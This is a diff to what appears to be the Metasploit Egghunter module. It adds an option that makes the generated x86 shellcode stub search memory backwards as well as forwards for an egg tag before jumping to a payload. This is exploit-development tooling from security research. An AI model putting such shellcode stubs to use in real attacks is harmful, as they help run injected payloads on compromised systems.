@@ -22,6 +22,7 @@ module Exploitation
 # Conversion to use Metasm by jduck
 # Startreg code added by corelanc0d3r
 # Added routine to disable DEP for discovered egg (for win, added by corelanc0d3r)
+# Added support for searchforward option (true or false)
 #
 ###
 class Egghunter
@@ -42,7 +43,8 @@ class Egghunter
 			#
 			def hunter_stub(payload, badchars = '', opts = {})
 
-				startreg = opts[:startreg]
+				startreg      = opts[:startreg]
+				searchforward = opts[:searchforward]
 
 				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
 				marker = "0x%x" % opts[:eggtag].unpack('V').first
@@ -59,6 +61,19 @@ class Egghunter
 				end
 				startstub << "\n\t" if startstub.length > 0
 
+				# search forward or backward ?
+				flippage = "\n\tor dx,0xfff"
+				edxdirection = "\n\tinc edx"
+
+				if searchforward
+					if searchforward.to_s.downcase == 'false'
+						# go backwards
+						flippage = "\n\txor dl,dl"
+						edxdirection = "\n\tdec edx"
+					end
+				end
+
+				# other vars
 				getpointer   = ''
 				getsize      = ''
 				getalloctype = ''
@@ -194,9 +209,9 @@ class Egghunter
 #{getpointer}
 #{startstub}
 check_readable:
-	or dx,0xfff
+	#{flippage}
 next_addr:
-	inc edx
+	#{edxdirection}
 	push edx
 	push 0x02   ; use NtAccessCheckAndAuditAlarm syscall
 	pop eax
@@ -213,10 +228,8 @@ check_for_tag:
 	; it must match a second time too
 	scasd
 	jne next_addr
-
 	; check the checksum if the feature is enabled
 #{checksum}
-
 	; jump to the payload
 	#{jmppayload}
 EOS
